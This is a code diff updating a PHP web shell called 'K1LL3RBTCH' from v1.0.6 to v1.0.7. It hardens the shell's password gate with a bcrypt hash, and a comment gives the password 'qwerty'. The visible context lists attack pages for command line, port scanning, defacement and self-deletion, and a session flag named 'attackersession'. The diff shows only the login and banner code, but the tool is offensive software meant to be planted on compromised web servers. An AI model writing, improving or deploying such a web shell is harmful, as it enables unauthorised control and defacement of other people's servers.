@@ -48,7 +48,7 @@ SOFTWARE.
 session_start(); // start session
 ob_start(); // start cleaning
 
-$access_key = filter_var("qwerty", FILTER_SANITIZE_STRING); // password (You can set your own)
+$access_key = '$2y$10$jeA4egHCKEU/rve9h/0lZO5fsLTsmt28Upxyj.edxjuE3QFtLaMbW'; // password: qwerty
 
 // array with $_GET pages
 $switch = ['home', 'securityinformation', 'commandline', 'portscan', 'script', 'deface', 'phpinfo', 'suicide', 'logout'];
@@ -144,29 +144,32 @@ class Loginsystem
     // when attacker submits login button
     if(isset($_POST['login']))
     {
-      // check password input
-      if(empty(filter_var($_POST['key'], FILTER_SANITIZE_STRING)))
+      // first we gonna check if the user entered some input
+      if(EMPTY(filter_var($_POST['key'], FILTER_SANITIZE_STRING)))
       {
-        // show errormessage
-        loginerror("Field cannot be empty. Fill in your key.");
+        // show error message for empty input.
+        loginerror('Field cannot be empty.');
 
-      // if access key is not equal to $_POST['key']
-      } elseif(isset($_POST['key']) AND $_POST['key'] !== $access_key)
+      // when user entered something:
+      } elseif(!empty(filter_var($_POST['key'], FILTER_SANITIZE_STRING)))
       {
-        // show errormessage
-        loginerror("Wrong key. Access Denied.");
+        // now we gonna check if the user entered a wrong key:
+        if(!password_verify($_POST['key'], $access_key))
+        {
+          // show error message for wrong key input:
+          loginerror('Wrong key. Access denied.');
 
-      // if access key is equal to $_POST['key']
-      } elseif(isset($_POST['key']) AND $_POST['key'] === $access_key)
-      {
-        // generate a new session id (prevents session hijacking etc etc.)
-        session_regenerate_id(TRUE); // set to true
-
-        // $_SESSION['attackersession'] will become true bc $_POST['key'] is equal to $access_key
-        $_SESSION['attackersession'] = true;
-
-        // redirect to the admin panel
-        header('Location: '.$_SERVER['PHP_SELF'].'?');
+        } elseif(password_verify($_POST['key'], $access_key))
+        {
+          // regenerate a new session ID
+          session_regenerate_id();
+          // login session becomes true:
+          $_SESSION['attackersession'] = TRUE;
+          // redirect to the admin page:
+          header("Location: ".$_SERVER['PHP_SELF']."?");
+          // die the script:
+          exit; // EXIT SCRIPT
+        }
       }
     }
   }
@@ -194,7 +197,7 @@ class Loginsystem
     if(!isset($_SESSION['attackersession']))
     {
       // show login form
-      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.6 by It0sh1</title>");
+      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.7 by It0sh1</title>");
       // include favicon
       favicon();
       print("</head><body style='background-color: black;'>");
@@ -204,7 +207,7 @@ class Loginsystem
       print("<br><br>");
 
       // CSS for error message.
-      print("<b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.6 by It0sh1</b>");
+      print("<b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.7 by It0sh1</b>");
       print("<form method='POST' action='' style='color: white;'>");
       print("<br><br><b style='color: white;'>Password:</b>\n<input type='password' id='keyinput' placeholder='Enter your password.' id='id_password' name='key' style='width: 260px; height: 2.60%;border: 2px solid #6C686C; background-color: black; color: white;'>&nbsp;<input type='checkbox' onclick='ShowPassword()'' title='show password'>&nbsp;");
       print("<button type='submit' name='login' style='height: 2.60%; background-color: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer; font-size: 12px;'>login</button><br><br>");
@@ -245,11 +248,11 @@ class Loginsystem
     if(isset($_SESSION['attackersession']))
     {
       // show admin login panel
-      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.6</title>");
+      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.7</title>");
       // insert favicon
       favicon();
       print("</head><body style='background-color: black;'>");
-      print("<code style='color: #FFE6E8; font-size: 14px;'><center><b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.6 - Made by It0sh1</b><hr></center>");
+      print("<code style='color: #FFE6E8; font-size: 14px;'><center><b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.7 - Made by It0sh1</b><hr></center>");
       print("<center style='float: right;'>");
       print("<b style='float: right;'>".self::img()."</b></center>");
       print("<b style='color: #B22222; font-size: 13px;'>System: </b>".PHP_UNAME()."<br>");
